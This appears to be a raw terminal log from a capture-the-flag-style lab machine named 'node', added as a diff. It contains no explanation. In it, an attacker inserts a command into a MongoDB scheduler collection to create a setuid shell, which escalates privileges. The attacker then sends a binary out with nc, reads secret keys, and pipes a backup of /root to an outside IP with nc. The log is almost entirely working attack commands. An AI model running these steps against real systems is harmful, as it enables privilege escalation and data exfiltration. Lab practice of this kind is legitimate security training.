@@ -1,0 +1,94 @@
+mark@node:/tmp$ mongo -p -u mark scheduler
+MongoDB shell version: 3.2.16           
+Enter password:     
+connecting to: scheduler                
+> db.tasks.insert( { "cmd" : chown tom:admin /tmp/ippsec; chmod 6755 /tmp/ippsec;"};                        
+2019-12-25T03:45:06.203+0000 E QUERY    [thread1] SyntaxError: missing } after property list @(shell):1:33  
+
+> db.tasks.insert( { "cmd" : "chown tom:admin /tmp/ippsec; chmod 6755 /tmp/ippsec;"};                       
+...                 
+... ;               
+... );              
+2019-12-25T03:45:25.171+0000 E QUERY    [thread1] SyntaxError: missing ) after argument list @(shell):1:82  
+
+> db.tasks.insert( { "cmd" : "chown tom:admin /tmp/ippsec; chmod 6755 /tmp/ippsec;"});                      
+WriteResult({ "nInserted" : 1 })                   
+> db.tasks.find()                                  
+{ "_id" : ObjectId("5e02db581af812116fc797ec"), "cmd" : "chown tom:admin /tmp/ippsec; chmod 6755 /tmp/ippsec;" }         
+> exit              
+bye                 
+mark@node:/tmp$ ls                                 
+ippsec  mongodb-27017.sock  systemd-private-f5c4f6f0600d4c02b807b238443d1a4d-systemd-timesyncd.service-BnSfT6  vmware-root             
+mark@node:/tmp$ ./ippsec -p                        
+$ id                                               
+uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)                 
+$ /usr/local/bin/backup                            
+$ /usr/local/bin/backup /               
+$ bash              
+bash-4.3$ exit                          
+exit                
+$ /usr/local/bin/backup /               
+$ nc 10.10.14.3 8081 < /usr/local/bin/backup
+./ippsec: 6: cannot open /usr/locall/bin/backup: No such file      
+$ nc 10.10.14.3 8081 < /usrlocal/bin/backup
+./ippsec: 7: cannot open /usrlocal/bin/backup: No such file        
+$ nc 10.10.14.24 8081 < /usr/local/bin/backup
+$ cd /etc/myplace        
+$ ls                     
+keys                     
+$ cat keys               
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508   
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474   
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110   
+
+$ cd /var/               
+$ ls      
+backups  lib    log   run        spool  
+cache    local  mail  scheduler  tmp    
+crash    lock   opt   snap       www    
+$ cd www  
+$ ls      
+myplace   
+$ cd myplace        
+$ ls      
+app.html      package.json              
+app.js        package-lock.json         
+node_modules  static                    
+$ grep -Ri backup . 
+./app.js:const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';            
+./app.js:  app.get('/api/admin/backup', function (req, res) {      
+./app.js:      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);                   
+./app.js:      var backup = '';         
+./app.js:        res.header("Content-Disposition", "attachment; filename=myplace.backup");                  
+./app.js:        res.send(backup);      
+./app.js:        backup += chunk;       
+./static/vendor/jquery/jquery.js:      contextBackup = outermostContext,         
+./static/vendor/jquery/jquery.js:      dirrunsUnique = (dirruns += contextBackup == null ? 1 : Math.random() || 0.1),    
+./static/vendor/jquery/jquery.js:      outermostContext = contextBackup;         
+./static/assets/js/app/controllers/admin.js:  $scope.backup = function () {      
+./static/assets/js/app/controllers/admin.js:    $window.open('/api/admin/backup', '_self');                 
+./static/partials/admin.html:          <button class="btn btn-large btn-primary" ng-click="backup()">Download Backup</button>          
+$ ls      
+app.html      package.json              
+app.js        package-lock.json         
+node_modules  static                    
+$ cat /etc/myplace/keys                 
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508   
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474   
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110   
+
+$ cd /                                                
+$ ls                       
+bin         initrd.img.old  media  sbin  var          
+boot        lib             mnt    snap  vmlinuz      
+dev         lib32           opt    srv   vmlinuz.old  
+etc         lib64           proc   sys                
+home        libx32          root   tmp                
+initrd.img  lost+found      run    usr                
+$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root | nc 10.10.14.24 9001   
+$ exit       
+mark@node:/tmp$ eexit      
+eexit: command not found   
+mark@node:/tmp$ exit       
+logout       
+Connection to 10.10.10.58 closed.                     
